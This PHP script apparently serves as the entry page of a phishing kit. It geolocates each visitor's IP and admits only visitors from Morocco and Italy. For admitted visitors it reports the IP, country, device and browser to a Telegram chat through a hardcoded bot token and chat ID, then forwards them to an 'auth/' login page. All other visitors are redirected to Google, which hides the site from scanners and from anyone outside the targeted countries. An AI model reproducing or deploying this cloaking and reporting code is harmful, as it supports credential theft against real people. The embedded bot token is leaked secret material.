<?php
require_once 'includes/main.php';
require "main.php";

// Function to get client IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) // Cloudflare
        $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    else if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    
    // Handle multiple IPs in X_FORWARDED_FOR
    if (strpos($ipaddress, ',') !== false) {
        $ips = explode(',', $ipaddress);
        $ipaddress = trim($ips[0]);
    }
    
    return $ipaddress;
}

// Function to detect device type
function getDeviceType() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $mobileAgents = ['Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi'];
    
    foreach ($mobileAgents as $agent) {
        if (stripos($userAgent, $agent) !== false) return 'Mobile';
    }
    
    if (stripos($userAgent, 'Tablet') !== false || stripos($userAgent, 'iPad') !== false) {
        return 'Tablet';
    }
    
    return 'Desktop';
}

// Enhanced function to get country from IP using multiple reliable services
function getCountryFromIP($ip) {
    if ($ip === 'UNKNOWN' || $ip === '127.0.0.1' || $ip === '::1') {
        return 'Localhost';
    }
    
    // List of reliable IP geolocation APIs (with fallback order)
    $apis = [
        // Primary: ipapi.co (reliable and generous free tier)
        [
            'url' => "https://ipapi.co/{$ip}/country_name/",
            'field' => null, // Returns plain text country name
            'type' => 'text'
        ],
        // Secondary: ip-api.com (very reliable, JSON format)
        [
            'url' => "http://ip-api.com/json/{$ip}",
            'field' => 'country',
            'type' => 'json'
        ],
        // Tertiary: api.ipify.org (reliable, simple API)
        [
            'url' => "https://api.ipify.org?format=json&ip={$ip}",
            'field' => null, // This API doesn't provide country, but we'll use it as last resort with different endpoint
            'type' => 'json'
        ],
        // Fourth: ipinfo.io (reliable, good free tier)
        [
            'url' => "https://ipinfo.io/{$ip}/country",
            'field' => null, // Returns plain text country code
            'type' => 'text'
        ],
        // Fifth: db-ip.com (your original choice, kept as fallback)
        [
            'url' => "https://api.db-ip.com/v2/free/{$ip}",
            'field' => 'countryName',
            'type' => 'json'
        ]
    ];
    
    // Custom function to make API requests with timeout
    $makeRequest = function($url, $type) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 3, // 3 second timeout
                'header' => "User-Agent: Mozilla/5.0 (compatible; IP-Checker/1.0)\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);
        
        try {
            $response = @file_get_contents($url, false, $context);
            if ($response === false) return null;
            
            if ($type === 'json') {
                $data = json_decode($response, true);
                return $data;
            }
            
            return trim($response);
        } catch (Exception $e) {
            return null;
        }
    };
    
    // Try each API in order until we get a valid result
    foreach ($apis as $api) {
        $result = $makeRequest($api['url'], $api['type']);
        
        if ($result !== null) {
            if ($api['type'] === 'json' && $api['field'] && isset($result[$api['field']])) {
                $country = $result[$api['field']];
                if (!empty($country) && $country !== 'Unknown') {
                    return $country;
                }
            } elseif ($api['type'] === 'text' && !empty($result)) {
                return $result;
            }
        }
        
        // Small delay to avoid rate limiting
        usleep(100000); // 100ms delay
    }
    
    // If all APIs fail, try a final fallback with a different approach
    $finalFallback = getCountryFinalFallback($ip);
    if ($finalFallback !== 'Unknown') {
        return $finalFallback;
    }
    
    return 'Unknown';
}

// Final fallback function using additional services
function getCountryFinalFallback($ip) {
    $additionalApis = [
        "https://api.country.is/{$ip}",
        "https://get.geojs.io/v1/ip/country/{$ip}.json",
        "https://json.geoiplookup.io/{$ip}"
    ];
    
    foreach ($additionalApis as $apiUrl) {
        try {
            $context = stream_context_create([
                'http' => ['timeout' => 2],
                'ssl' => ['verify_peer' => false]
            ]);
            
            $response = @file_get_contents($apiUrl, false, $context);
            if ($response === false) continue;
            
            $data = json_decode($response, true);
            
            // Check for country fields in different APIs
            if (isset($data['country'])) return $data['country'];
            if (isset($data['country_name'])) return $data['country_name'];
            if (isset($data['country_name'])) return $data['country_name'];
            
        } catch (Exception $e) {
            continue;
        }
    }
    
    return 'Unknown';
}

// Function to get browser information
function getBrowser() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) 
        return 'Internet Explorer';
    elseif (strpos($userAgent, 'Edg') !== false) 
        return 'Microsoft Edge';
    elseif (strpos($userAgent, 'Chrome') !== false) 
        return 'Google Chrome';
    elseif (strpos($userAgent, 'Firefox') !== false) 
        return 'Mozilla Firefox';
    elseif (strpos($userAgent, 'Safari') !== false) 
        return 'Safari';
    elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) 
        return 'Opera';
    else 
        return 'Unknown';
}

// Function to send data to Telegram
function sendToTelegram($data) {
    $botToken = '2095671323:AAEaOuqBLapqHJspiH8BTdmK6GuzHG61pYQ';
    $chatId = '-4566774456';
    
    $emoji = $data['status'] === 'Allowed' ? '✅' : '❌';
    
    $message = "{$emoji} <b>New Visitor Detected</b> {$emoji}\n";
    $message .= "┌────────────────────────\n";
    $message .= "├ <b>IP:</b> <code>" . ($data['ip'] ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>Country:</b> " . ($data['country'] ?? 'Unknown') . "\n";
    $message .= "├ <b>Device:</b> " . ($data['device'] ?? 'Unknown') . "\n";
    $message .= "├ <b>Browser:</b> " . ($data['browser'] ?? 'Unknown') . "\n";
    $message .= "├ <b>Status:</b> " . ($data['status'] ?? 'Unknown') . "\n";
    $message .= "└────────────────────────\n";
    $message .= "<i>Time: " . date('Y-m-d H:i:s') . "</i>";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Collect visitor information
$visitorIP = getClientIP();
$visitorCountry = getCountryFromIP($visitorIP);

// Check if visitor is from allowed countries (Morocco or Italy)
$allowedCountries = ['Morocco', 'Italy'];
$isAllowed = in_array($visitorCountry, $allowedCountries);

$visitorData = [
    'ip' => $visitorIP,
    'country' => $visitorCountry,
    'device' => getDeviceType(),
    'browser' => getBrowser(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'status' => $isAllowed ? 'Allowed' : 'Blocked'
];

// Send report to Telegram only for allowed countries
if ($isAllowed) {
    sendToTelegram($visitorData);
}

// Redirect unauthorized visitors to Google
if (!$isAllowed) {
    // Log blocked attempts (optional)
    header("Location: https://www.google.com");
    exit;
}

// Redirect to auth page if access is allowed
header("location: auth/");
exit;
?>